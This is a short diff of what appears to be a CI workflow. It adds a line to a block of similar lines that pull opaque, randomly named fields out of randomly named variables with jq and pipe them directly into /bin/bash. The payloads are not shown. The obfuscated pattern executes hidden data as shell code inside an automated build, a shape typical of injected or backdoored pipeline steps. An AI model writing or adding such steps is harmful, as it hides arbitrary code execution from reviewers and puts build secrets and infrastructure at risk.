@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$bghj08848" | jq -r .hz749 | /bin/bash
           printf '%s' "$jh2400" | jq -r .b241 | /bin/bash
           printf '%s' "$yn88" | jq -r .vky84954 | /bin/bash
+          echo $fywn42 | jq -r .ubfz93 | /bin/bash
 
       - name: Persist output
         if: always()
